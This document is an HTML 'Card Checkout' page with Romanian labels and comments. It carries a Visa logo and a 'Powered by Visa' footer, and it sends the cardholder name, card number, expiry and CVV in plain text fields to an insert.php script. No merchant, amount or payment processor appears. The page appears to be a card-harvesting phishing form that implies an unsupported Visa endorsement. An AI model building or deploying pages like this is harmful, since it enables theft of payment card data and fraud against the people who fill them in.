<!DOCTYPE html>
<html>
<head>
    <title>Card Checkout</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }

        .card-form {
            width: 300px;
            margin: 0 auto;
            background-color: #FFCCCC; /* Roz deschis */
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
            color: #888; /* Gri deschis */
        }

        input[type="text"] {
            width: 100%;
            padding: 8px 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
            color: #888; /* Gri deschis */
        }

        input[type="text"]:focus {
            color: black;
        }

        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #9370DB; /* Mov deschis lavanda */
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); /* Umbra */
        }

        input[type="submit"]:hover {
            background-color: #7B68EE; /* Mov inchis lavanda */
        }

        .visa-logo {
            position: absolute;
            top: 10px;
            right: 10px;
            width: 70px;
            height: auto;
            filter: drop-shadow(2px 2px 2px rgba(0,0,0,0.5)); /* Umbră */
        }

        .card-title {
            text-align: center;
            color: white; /* Text alb */
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .card-footer {
            text-align: center;
            color: white; /* Text alb */
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
	<script>
        function formatCardNumber(input) {
            // Eliminăm toate spațiile din input
            let value = input.value.replace(/\s+/g, '');
            // Splităm valoarea în grupuri de câte 4 cifre
            let formattedValue = value.match(/.{1,4}/g);
            // Alăturăm grupurile de câte 4 cu spațiu între ele
            if (formattedValue) {
                input.value = formattedValue.join(' ');
            }
        }
    </script>
</head>
<body>
    <div class="card-form">
        <img class="visa-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa Logo">
        <div class="card-title">Card Checkout</div>
        <form method="POST" action="insert.php">
            <label for="name">Nume:</label>
            <input type="text" name="name"  required><br>

            <label for="cardn">Număr card:</label>
           <input type="text" name="cardn" id="cardn" oninput="formatCardNumber(this)" required><br>

            <label for="expire_date">Luna  expirării:</label>
            <input type="text" name="expire_date"  required><br>

            <label for="an">AN:</label>
            <input type="text" name="an" value="YY" required><br>

            <label for="cvv">CVV:</label>
            <input type="text" name="cvv" value="CVV/CVV2" required><br>

            <input type="submit" value="Submit">
        </form>
        <div class="card-footer">Powered by Visa</div>
    </div>
</body>
</html>
